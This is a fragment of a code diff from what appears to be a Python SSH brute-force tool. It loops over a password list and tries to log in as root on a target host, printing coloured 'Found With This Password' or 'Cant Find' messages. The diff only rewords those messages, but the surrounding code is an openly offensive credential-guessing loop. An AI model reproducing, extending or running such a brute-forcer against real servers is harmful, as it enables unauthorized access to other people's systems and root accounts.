@@ -46,9 +46,9 @@ def main():
             try:
                 for passlist in file:      
                     ssh.connect(host , port=port , username='root' , password=passlist)
-                    print(Colorate.Horizontal(Colors.green_to_cyan , f'Found With This Password {passlist} And This User : root' , 2))
+                    print(Colorate.Horizontal(Colors.green_to_cyan , f'Found With This Password {passlist} And User : root' , 2))
             except:
-                print(Colorate.Horizontal(Colors.red_to_purple , f'Cant Find With This Password {passlist} And This User : root' , 2))
+                print(Colorate.Horizontal(Colors.red_to_purple , f'Cant Find With This Password {passlist} And User : root' , 2))
         except socket.timeout:
             print(f'{red} Timed Out xD !!!')
 
